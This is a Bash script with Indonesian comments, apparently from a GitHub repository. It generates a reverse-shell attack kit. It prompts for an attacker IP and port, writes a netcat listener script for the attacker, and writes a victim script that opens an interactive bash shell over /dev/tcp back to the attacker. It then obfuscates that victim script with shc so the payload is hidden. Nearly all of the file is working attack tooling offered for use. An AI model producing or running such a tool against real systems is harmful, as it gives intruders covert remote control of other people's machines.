#!/bin/bash
# [reverse-shell-tcp.sh]
# Program Bash sederhana yang dirancang untuk melakukan reverse shell melalui koneksi TCP menggunakan netcat.
# Dibuat oleh: fixploit03
# Github: https://github.com/fixploit03/reverse-shell-tcp

echo ""
echo "╦═╗╔═╗╦  ╦╔═╗╦═╗╔═╗╔═╗  ╔═╗╦ ╦╔═╗╦  ╦    ╔╦╗╔═╗╔═╗"
echo "╠╦╝║╣ ╚╗╔╝║╣ ╠╦╝╚═╗║╣   ╚═╗╠═╣║╣ ║  ║     ║ ║  ╠═╝"
echo "╩╚═╚═╝ ╚╝ ╚═╝╩╚═╚═╝╚═╝  ╚═╝╩ ╩╚═╝╩═╝╩═╝   ╩ ╚═╝╩  "
echo ""

file_attacker="run.sh"

# Memasukkan IP penyerang (Attacker)
while true; do
	read -p "[#] Masukkan IP penyerang: " ip
	if [[ -z "${ip}" ]]; then
		echo "[-] IP penyerang tidak boleh kosong."
		continue
	fi
	break
done

# Memasukkan Port penyerang (Attacker)
while true; do
	read -p "[#] Masukkan Port penyerang (4444): " port
	if [[ -z "${port}" ]]; then
		echo "[-] Port penyerang tidak boleh kosong."
		continue
	fi
	break
done

# Memasukkan nama file output untuk mesin target (Korban)
while true; do
	read -p "[#] Output file yang akan dijalankan di mesin target (.sh): " output
	if [[ -z "${output}" ]]; then
                echo "[-] Output file tidak boleh kosong."
                continue
        fi
	if [[ "${output##*.}" != "sh" ]]; then
		echo "[-] Output file harus memiliki ekstensi (.sh)"
		continue
	fi
	break
done

# Membuat skrip yang akan dijalankan di mesin penyerang (Attacker)
cat << EOF > "${file_attacker}"
# [run.sh]
# Program Bash sederhana yang dirancang untuk melakukan reverse shell melalui koneksi TCP menggunakan netcat.
# Dibuat oleh: fixploit03
# Github: https://github.com/fixploit03/reverse-shell-tcp

port=${port}
echo ""
echo "╦═╗╔═╗╦  ╦╔═╗╦═╗╔═╗╔═╗  ╔═╗╦ ╦╔═╗╦  ╦    ╔╦╗╔═╗╔═╗"
echo "╠╦╝║╣ ╚╗╔╝║╣ ╠╦╝╚═╗║╣   ╚═╗╠═╣║╣ ║  ║     ║ ║  ╠═╝"
echo "╩╚═╚═╝ ╚╝ ╚═╝╩╚═╚═╝╚═╝  ╚═╝╩ ╩╚═╝╩═╝╩═╝   ╩ ╚═╝╩  "
echo ""
echo "[*] Menjalankan netcat pada port ${port}..."
sleep 3
nc -lvnp ${port}
EOF
chmod +x "${file_attacker}"

# Membuat skrip yang akan dijalankan di mesin terget (Korban)
cat << EOF > "${output}"
#!/bin/bash
echo "Tunggu beberapa saat..."
bash -i >& /dev/tcp/"${ip}"/"${port}" 0>&1
EOF

# Melakukan obfuscation menggunakan shc
shc -f "${output}" -o "${output}" -r

# Menghapus file yang tidak dibutuhkan yang dihasilkan oleh shc
file_ga_guna="${output}.x.c"
if [[ -f "${file_ga_guna}" ]]; then
	rm "${file_ga_guna}"
fi

echo ""
echo "[+] DONE..."
exit 0
